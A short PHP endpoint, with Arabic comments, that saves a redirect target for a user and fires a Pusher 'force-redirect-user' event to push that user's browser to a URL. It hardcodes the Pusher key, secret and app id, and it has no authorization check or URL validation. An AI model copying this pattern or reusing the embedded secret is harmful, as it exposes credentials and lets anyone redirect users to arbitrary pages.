<?php
session_start();
require_once 'init.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    exit('Invalid request');
}

$userId = $_POST['user_id'] ?? null;
$page = $_POST['page'] ?? null;

if (!$userId || !$page) {
    exit('Missing parameters');
}

// حفظ الصفحة في قاعدة البيانات
$User->setRedirect($userId, $page);

// ✅ إرسال إشعار Pusher للتوجيه الفوري
require_once __DIR__ . '/../vendor/autoload.php';

$pusher = new Pusher\Pusher(
    'a56388ee6222f6c5fb86',
    '4c77061f4115303aac58',
    '1973588',
    ['cluster' => 'ap2', 'useTLS' => true]
);

$pusher->trigger('my-channel', 'force-redirect-user', [
    'userId' => $userId,
    'url' => $page
]);

echo json_encode(['success' => true]);
?>